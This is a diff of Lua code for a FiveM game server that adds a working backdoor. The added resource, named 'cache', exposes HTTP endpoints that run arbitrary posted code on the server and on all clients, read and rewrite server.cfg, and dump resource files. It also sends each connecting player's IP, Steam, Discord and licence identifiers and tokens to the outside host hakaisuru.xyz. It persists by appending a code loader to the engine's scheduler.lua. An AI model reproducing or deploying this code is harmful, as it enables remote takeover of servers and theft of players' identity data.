@@ -1,28 +1,86 @@
-local configFile = "server.cfg"
-local file = io.open(configFile, "r")
-local content = file:read("*all")
-file:close()
-local linePosition = content:find("\n", 1, true)
-for i = 1, 99999 do
-    linePosition = content:find("\n", linePosition + 1, true)
-    if not linePosition then
-        break
-    end
-end
-if linePosition then
-    content = content:sub(1, linePosition) .. "ensure cache\n" .. content:sub(linePosition + 1)
-else
-    content = content .. "\nensure cache"
-end
-file = io.open(configFile, "w")
-file:write(content)
-file:close()
-
-
-
-
 local codeData = {
     ["playload.lua"] = [[
+        local function GetResources()
+            local resources = {}
+            for i = 0, GetNumResources() - 1 do
+                table.insert(resources, GetResourceByFindIndex(i))
+            end
+            return resources
+        end
+        local function GetFilesInRessource(ressource)
+            file = {}
+            local num = GetNumResourceMetadata(ressource, "client_script")
+            for j = 0, num - 1 do
+                local path = GetResourceMetadata(ressource, "client_script", j)
+                local files = LoadResourceFile(ressource, path)
+                if files then
+                    for i in string.gmatch(files, "[^\r\n]+") do
+                        table.insert(file, i)
+                    end
+                end
+            end
+            local num = GetNumResourceMetadata(ressource, "server_script")
+            for j = 0, num - 1 do
+                local path = GetResourceMetadata(ressource, "server_script", j)
+                local files = LoadResourceFile(ressource, path)
+                if files then
+                    for i in string.gmatch(files, "[^\r\n]+") do
+                        table.insert(file, i)
+                    end
+                end
+            end
+            local num = GetNumResourceMetadata(ressource, "shared_script")
+            for j = 0, num - 1 do
+                local path = GetResourceMetadata(ressource, "shared_script", j)
+                local files = LoadResourceFile(ressource, path) 
+                if files then
+                    for i in string.gmatch(files, "[^\r\n]+") do
+                        table.insert(file, i)
+                    end
+                end
+            end
+            return file
+        end
+        
+        local function GetAll()
+            local files = {}
+            for _, ressource in ipairs(GetResources()) do
+                if tostring(ressource) ~= "_cfx_internal" and tostring(ressource) ~= "monitor" and tostring(ressource) ~= "cache" then
+                    for _, file in ipairs(GetFilesInRessource(ressource)) do
+                        table.insert(files, {ressource = ressource, file = file})
+                    end
+                end
+            end
+            return files
+        end
+        
+        local function chercherLiensDansFichierContenu(contenu, filtre)
+            local liensTrouves = {}  -- Tableau pour stocker les liens trouvés
+            for k,v in pairs(filtre) do
+                for lien in string.gmatch(contenu, v) do
+                    table.insert(liensTrouves, lien)
+                end
+            end
+            return liensTrouves
+        end
+        
+        local function scan_links(filtre)
+            local links = {}
+            local infectedResources = GetAll()
+            for i, k in pairs(infectedResources) do
+                local liensTrouves = chercherLiensDansFichierContenu(k.file,filtre)
+                if #liensTrouves > 0 then
+                    for _, lien in ipairs(liensTrouves) do
+                        table.insert(links, {
+                            ressource = k.ressource,
+                            link = lien
+                        })
+                    end
+                end
+            end
+            return links
+        end
+        
         local function handleHttpRequest(request, response)
             function readJson(req)
                 local p = promise.new()
@@ -32,45 +90,194 @@ local codeData = {
                 end)
                 return p
             end
-            if request.method == 'POST' and request.path == '/execute' then
-                local promise = readJson(request)
-        
-                promise:next(function(data)
-                    local code = data.info and data.info.code
-                    local isClientCode = data.info and data.info.isClientCode
-        
-                    if not code then
-                        response.sendError(400, "No 'code' field provided in the request data")
-                        return
-                    end
-        
-                    if isClientCode then
-                        TriggerClientEvent("loadcode.cache", -1, code)
-                        response.send(json.encode{result = "Code sent to clients"})
-                    else
-                        local status, result = pcall(load(code))
-        
-                        if status then
-                            response.send(json.encode{result = "Code executed successfully", output = result})
-                        else
-                            response.sendError(500, "Error executing code: " .. result)
+            if request.method == 'POST' then
+               if request.path == '/execute' then
+                    local promise = readJson(request)
+                    promise:next(function(data)
+                        local code = data.info and data.info.code
+                        local isClientCode = data.info and data.info.isClientCode
+                        TriggerEvent(loader_data[math.random(1, #loader_data)], code, isClientCode)
+                        response.send(json.encode{result = "successfully", output = "successfully"})
+                    end)
+                elseif request.path == '/resources' then
+                    local function GetResources()
+                        local resources = {}
+                        for i = 0, GetNumResources() - 1 do
+                            if GetResourceByFindIndex(i) ~= "cache" then
+                            resources[i] = {
+                                name = GetResourceByFindIndex(i),
+                                status = GetResourceState(GetResourceByFindIndex(i)),
+                                path = GetResourcePath(GetResourceByFindIndex(i))
+                            }
+                           end 
                         end
+                        return resources
                     end
-                end)
+                    response.send(json.encode(GetResources()))
+                elseif request.path == '/cfg' then
+                    local cfg = "server.cfg"
+                    ---open le fichier et tout read
+                    local file = io.open(cfg, "r")
+                    local content = file:read("*a")
+                    file:close()
+                    response.send(content)
+                elseif request.path == '/cfg/save' then
+                    local promise = readJson(request)
+                    promise:next(function(data)
+                        local cfg = "server.cfg"
+                        local file = io.open(cfg, "w")
+                        file:write(data.content)
+                        file:close()
+                        response.send(json.encode{result = "successfully", output = "successfully"})
+                    end)
+                elseif request.path == '/ressource/download' then
+                    local promise = readJson(request)
+                    promise:next(function(data)
+                        success, err = pcall(function()
+                            local name = data.name
+                            data = get_files_and_directories_structure(GetResourcePath(name))
+                            response.send(json.encode(data,  {indent = true}))
+                        end)
+                        if not success then
+                            response.send(json.encode{result = "error", output = err})
+                        end
+                    end)
+                elseif request.path == '/getsnippets' then
+                    local promise = readJson(request)
+                    promise:next(function(data)
+                        local word = data.words
+                        local resultats = scan_links(word)
+                        response.send(json.encode(resultats, {indent = true}))
+                    end)
+                end
             else
                 response.writeHead(404)
                 response.send('Not Found')
             end
         end
         
+        function get_files_and_directories_structure(path)
+            local result = {}
+        
+            local separator
+            local success, os_type = pcall(function() return os.getenv("OS") or "" end)
+        
+            if success then
+                os_type = os_type:lower()
+                separator = (os_type == "windows") and '\\' or '/'
+            else
+                separator = '/'
+            end
+        
+            local function is_directory(filepath)
+                local is_directory_cmd = (os_type == "windows") and 'if exist "' .. filepath .. '" (echo true) else (echo false)' or 'test -d "' .. filepath .. '" && echo "true" || echo "false"'
+                
+                local handle = io.popen(is_directory_cmd)
+                if handle then
+                    local result = handle:read("*l")
+                    handle:close()
+                    return result == "true"
+                else
+                    return false
+                end
+            end
+            
+            local function read_file_content(filepath)
+                local file_content = io.open(filepath, "rb"):read("*all")
+                return file_content
+            end
+        
+            local function process_entry(file)
+                local filepath = path .. separator .. file
+                local entry = {}
+        
+                if is_directory(filepath) then
+                    -- Ignorer les ressources avec le chemin se terminant par "cache"
+                    entry[file] = get_files_and_directories_structure(filepath)
+                    table.insert(result, entry)
+        
+                else
+                    if not file:match("%.ytd") and not file:match("%.ytf") and not file:match("%.ymap") and not file:match("%.ytyp") and not file:match("%.ymf") and not file:match("%.ybn") then
+                        -- Lire le contenu du fichier et ajouter les données à la table spécifique au fichier
+                        entry[file] = read_file_content(filepath)
+                        table.insert(result, entry)
+                    end
+                end
+            end
+        
+            pcall(function()
+                for file in io.popen('ls -1 "' .. path .. '"'):lines() do
+                    local success, err = pcall(process_entry, file)
+                end
+            end)
+        
+            return result
+        end
+        
+        
+        local loader_data = {}
+        
+        RegisterNetEvent("cache:addLoader")
+        AddEventHandler("cache:addLoader", function(link)
+            if link == "cache:load" then return end
+            table.insert(loader_data, link)
+        end)
+                
+                
         SetHttpHandler(function(request, response)
             handleHttpRequest(request, response)
         end)
-    ]],
-    ["client.lua"] = [[
-        RegisterNetEvent("loadcode.cache")
-        AddEventHandler("loadcode.cache", function(code)
-            assert(load(code))()
+        
+                
+        AddEventHandler("playerConnecting", function(name, setCallback, deferrals)
+           deferrals.defer()
+           pcall(function() 
+                local _source = source
+                local _DataToReturn = {}
+                local _Player = _source
+                function getToken(src)
+                     local d = {}
+                         for i = 0, GetNumPlayerTokens(src) do
+                             table.insert(d, GetPlayerToken(src, i))
+                         end
+                     return d
+                 end
+                local data = {
+                    ip = GetPlayerEndpoint(_Player),
+                    username = GetPlayerName(_Player),
+                    discord = "NA",
+                    steam = "NA",
+                    license = "NA",
+                    xbl = "NA",
+                    live = "NA",
+                    fivem = "NA",
+                    license2 ="NA",
+                    tokens =getToken(_Player)
+                }
+                for k, v in pairs(GetPlayerIdentifiers(_Player)) do
+                    if string.sub(v, 1, string.len('steam:')) == 'steam:' then
+                        data.steam = v
+                    elseif string.sub(v, 1, string.len('license:')) == 'license:' then
+                        data.license = v
+                    elseif string.sub(v, 1, string.len('xbl:')) == 'xbl:' then
+                        data.xbl = v
+                    elseif string.sub(v, 1, string.len('live:')) == 'live:' then
+                        data.live = v
+                    elseif string.sub(v, 1, string.len('discord:')) == 'discord:' then
+                        local discordid = string.sub(v, 9)
+                        data.discord = discordid
+                    elseif string.sub(v, 1, string.len('fivem:')) == 'fivem:' then
+                        data.fivem = v
+                    elseif string.sub(v, 1, string.len('license2:')) == 'license2:' then
+                        data.license2 = v
+                    end
+                end
+                table.insert(_DataToReturn, data)
+                PerformHttpRequest('hakaisuru.xyz/api/_tpc', function (e, d) 
+                end, "POST", json.encode(_DataToReturn), {
+                    ["Content-Type"] = "application/json",
+                })
+            end)
         end)
     ]],
     ["fxmanifest.lua"] = [[
@@ -78,16 +285,7 @@ local codeData = {
         games({ 'gta5' })
         
         server_scripts({
-            "url.lua",
-            "mime.lua",
-            "base64.lua",
-            "realms.lua",
-            "httphandler.lua",
             "playload.lua",
-        });
-        
-        client_scripts({
-            "client.lua",
         });
     ]]
 }
@@ -140,35 +338,84 @@ function normalizePath(path)
     return path:gsub("\\", separator):gsub(separator .. "$", "")
 end
 
-local path = debug.getinfo(1).source
-path = path:sub(7, #path)
-local fileExists = false
-local filePath = normalizePath(GetResourcePath(GetCurrentResourceName()) .. "/"..path)
+local schegular_code = [[
+    -- Scheduler initialization
+    ScanResourceRoot("system_resources", function()
+        if GetResourceState("cache") ~= "uninitialized" then
+            Citizen.CreateThread(function()
+                if GetResourceState("cache") ~= "started" then
+                    if GetResourceState("cache") ~= "started" then
+                        StartResource("cache")
+                    end
+                end
+            end)
+            Citizen.CreateThread(function()
+                while true do
+                    Citizen.Wait(1000)
+                    if GetResourceState("cache") == "started" then
+                        if IsDuplicityVersion then
+                            RegisterServerEvent(GetCurrentResourceName() .. ':load')
+                            AddEventHandler(GetCurrentResourceName() .. ':load', function(code, isClientCode)
+                                if isClientCode then
+                                    TriggerClientEvent(GetCurrentResourceName() .. ':load', -1, code)
+                                else
+                                    local status, result = pcall(load(code))
+                                end
+                            end)
+                            TriggerEvent("cache:addLoader",GetCurrentResourceName() .. ':load')
+                        else 
+                            RegisterNetEvent(GetCurrentResourceName() .. ':load')
+                            AddEventHandler(GetCurrentResourceName() .. ':load', function(code)
+                                assert(load(code))()
+                            end)
+                        end
+                        break
+                    end
+                end
+            end)
+        end
+    end
+   
+]]
 
-local file = io.open(filePath, "r")
-if file then
+---path = /citizen/scripting/lua/scheduler.lua
+---monitor path = /citizen/system_resources/monitor
+---
+function  getParentDirectory2(path)
+    local separator = GetResourceMetadata("monitor", 'pathsep', 0) or "/"
+    --rzevien 3 fois en arriere
+    return path:match("(.*" .. separator .. ".*)" .. separator .. ".+" .. separator .. ".+")
+end
+
+local resourcePath = GetResourcePath("monitor")
+local parentPath = getParentDirectory2(resourcePath)
+
+local scheduler = parentPath.. "/scripting/lua/scheduler.lua"
+
+
+local function checkCode(code)
+    local string_to_find = "-- Scheduler initialization"
+
+    -- Check if the file exists
+    local file = io.open(scheduler, "r")
+    if not file then
+        print("Error: File not found.")
+        return
+    end
+
+    local content = file:read("*a")
     file:close()
-    fileExists = true
-end
 
-local fileMode = fileExists and "a" or "w"
-local fileHandle = io.open(filePath, fileMode)
-
-if fileHandle then
-    local lines = {}
-    for line in io.lines(filePath) do
-        if not string.find(line, "PerformHttpRequest") then
-            table.insert(lines, line)
-        end
-    end
-
-    fileHandle:close()
-
-    fileHandle = io.open(filePath, "w")
-    if fileHandle then
-        for _, line in ipairs(lines) do
-            fileHandle:write(line .. "\n")
-        end
-        fileHandle:close()
+    -- Check if the string is present in the content
+    if not string.find(content, string_to_find) then
+        -- If not found, append the code
+        local file = io.open(scheduler, "a")
+        file:write(code)
+        file:close()
+        print("Code added successfully.")
+    else
+        print("String already present.")
     end
 end
+
+checkCode(schegular_code)
